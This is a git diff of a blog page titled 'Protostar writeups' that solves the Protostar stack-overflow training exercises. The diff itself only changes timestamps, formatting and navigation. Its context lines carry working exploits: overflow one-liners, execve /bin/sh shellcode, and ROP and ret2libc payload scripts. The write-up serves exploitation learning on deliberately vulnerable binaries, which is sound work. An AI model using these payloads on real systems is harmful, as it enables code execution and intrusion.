@@ -69,7 +69,7 @@ stack 2">
 <meta property="og:description" content="stack 0python -c &quot;print &apos;A&apos;*65&quot; | ./stack0
 stack 1./stack1 $(python -c &quot;print &apos;dcba&apos;*17&quot;)
 stack 2">
-<meta property="og:updated_time" content="2016-07-21T02:23:08.000Z">
+<meta property="og:updated_time" content="2016-07-21T06:34:29.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Protostar writeups">
 <meta name="twitter:description" content="stack 0python -c &quot;print &apos;A&apos;*65&quot; | ./stack0
@@ -291,7 +291,7 @@ stack 2">
         <div class="post-meta">
           <span class="post-time">
             发表于
-            <time itemprop="dateCreated" datetime="2016-07-21T10:23:08+08:00" content="2016-07-21">
+            <time itemprop="dateCreated" datetime="2016-07-21T14:34:29+08:00" content="2016-07-21">
               2016-07-21
             </time>
           </span>
@@ -330,7 +330,7 @@ stack 2">
 <h2 id="stack_4">stack 4</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"print 'A'*76+'\xf4\x83\x04\x08'"</span> | ./stack4</span><br></pre></td></tr></table></figure>
 <h2 id="stack_5">stack 5</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./stack5'</span></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write)</span><br><span class="line">io.gdb_hint([<span class="number">0x80483da</span>])</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">    <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"</span></span><br><span class="line">    <span class="string">"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">76</span></span><br><span class="line">payload += l32(<span class="number">0xbffff7d6</span>)</span><br><span class="line">payload += <span class="string">'\x90'</span> * <span class="number">16</span>    </span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
 <h2 id="stack_6">stack 6</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./stack6'</span></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x080484f9</span>])</span><br><span class="line"></span><br><span class="line">adr_system  = <span class="number">0xbfecffb0</span></span><br><span class="line">plt_gets    = <span class="number">0x08048380</span></span><br><span class="line">p_ret       = <span class="number">0x08048453</span></span><br><span class="line">adr_stage   = <span class="number">0x08049000</span></span><br><span class="line"></span><br><span class="line">payload1    = <span class="string">'A'</span> * <span class="number">80</span></span><br><span class="line">payload1    += l32(plt_gets)</span><br><span class="line">payload1    += l32(p_ret)</span><br><span class="line">payload1    += l32(adr_stage)</span><br><span class="line">payload1    += l32(adr_system)</span><br><span class="line">payload1    += l32(adr_stage)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">"input path please:"</span>)</span><br><span class="line">io.writeline(payload1)</span><br><span class="line">io.writeline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-<h2 id="stack_7">stack 7</h2><p>利用gets函数把shellcode读到data段，然后通过栈溢出来执行data段上的shellcode</p>
+<h2 id="stack_7">stack 7</h2><p>利用<code>gets</code>函数把<code>shellcode</code>读到<code>data段</code>，然后通过栈溢出来执行<code>data段</code>上的<code>shellcode</code></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./stack7'</span></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x08048544</span>])</span><br><span class="line"></span><br><span class="line">plt_gets    = <span class="number">0x080483a4</span></span><br><span class="line">p_ret       = <span class="number">0x08048493</span></span><br><span class="line">adr_stage   = <span class="number">0x08049000</span></span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">        <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"</span></span><br><span class="line">        <span class="string">"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">payload1    = <span class="string">'A'</span> * <span class="number">80</span></span><br><span class="line">payload1    += l32(plt_gets)</span><br><span class="line">payload1    += l32(p_ret)</span><br><span class="line">payload1    += l32(adr_stage)</span><br><span class="line">payload1    += l32(adr_stage)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">"input path please:"</span>)</span><br><span class="line">io.writeline(payload1)</span><br><span class="line">io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
 </span>
       
@@ -343,8 +343,8 @@ stack 2">
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/07/21/def-con-qual-2016-babyfirst/" rel="next" title="def-con-qual-2016-babyfirst">
-                <i class="fa fa-chevron-left"></i> def-con-qual-2016-babyfirst
+              <a href="/2016/07/21/qiangwang-qual-2015-shellman/" rel="next" title="qiangwang-qual-2015-shellman">
+                <i class="fa fa-chevron-left"></i> qiangwang-qual-2015-shellman
               </a>
             
           </div>
@@ -424,7 +424,7 @@ stack 2">
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">3</span>
+              <span class="site-state-item-count">4</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
